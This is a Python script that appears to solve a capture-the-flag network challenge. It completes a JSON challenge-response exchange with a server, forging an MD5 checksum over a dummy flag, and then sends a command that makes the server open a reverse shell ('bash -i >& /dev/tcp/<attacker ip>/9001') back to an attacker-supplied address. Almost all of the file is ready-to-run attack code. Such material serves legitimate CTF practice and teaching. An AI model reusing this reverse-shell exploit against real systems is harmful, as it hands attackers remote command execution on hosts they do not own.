import socket
import hashlib
import json
import sys

if len(sys.argv) != 3:
    print("Usage: python3 solution.py <server_ip_address> <attacker_ip_address>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = 13942 # static doesn't need a argv

DUMMYTEAMNAME = "DUMMYTEAM" # used for hash purposes

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    
    # Send clientID
    clientID = "23456789" # can't be 12345678 to prevent replaying the pcap exactly
    clientIDJson = '{"clientID":'+ clientID +'}'
    s.sendall(clientIDJson.encode('utf-8'))

    # Receive challenge
    challengeMsg = s.recv(1024)
    jsonobj = json.loads(challengeMsg) # server will always send json so no try-except here

    challenge = jsonobj.get("challenge")

    if(challenge == None):
        # Server didn't send a challenge, we got an error
        print(jsonobj)
        exit()

    # Compute checksum & generate response
    # checksum = md5(clientID + challenge + flag)
    checksum = hashlib.md5((clientID + challenge + "FLAG{" + DUMMYTEAMNAME + "}").encode('utf-8')).hexdigest()

    # Triple quotes = multiline
    # Using %s instead of python's .format since json contains {}
    responseStr = ('{'
        '"clientID":%s,'
        '"challenge":"%s",'
        '"flag":"%s",'
        '"checksum":"%s"}' % (clientID, challenge, "FLAG{" + DUMMYTEAMNAME + "}", checksum))

    s.sendall(responseStr.encode('utf-8'))

    # Get result
    resultMsg = s.recv(1024)
    jsonobj = json.loads(resultMsg) # server will always send json so no try-except here
    print(jsonobj)

    # Spawn reverse shell
    print("Connecting reverse shell")

    attackip = sys.argv[2]
    # Slightly different than other challenges since server runs in sh not bash
    # credit: https://unix.stackexchange.com/questions/407798/syntax-error-bad-fd-number
    cmd = "bash -i >& /dev/tcp/"+attackip+"/9001 0>&1"
    s.sendall(('{"command":"' + cmd + '"}').encode('utf-8'))

    commandResponseMsg = s.recv(1024)
    jsonobj = json.loads(commandResponseMsg, strict=False) # strict=False to allow \n and other escape chars
    stdout = jsonobj["stdout"]
    stderr = jsonobj["stderr"]

    print(stdout)

    if(stderr != ""):
        print("stderr: " + stderr)
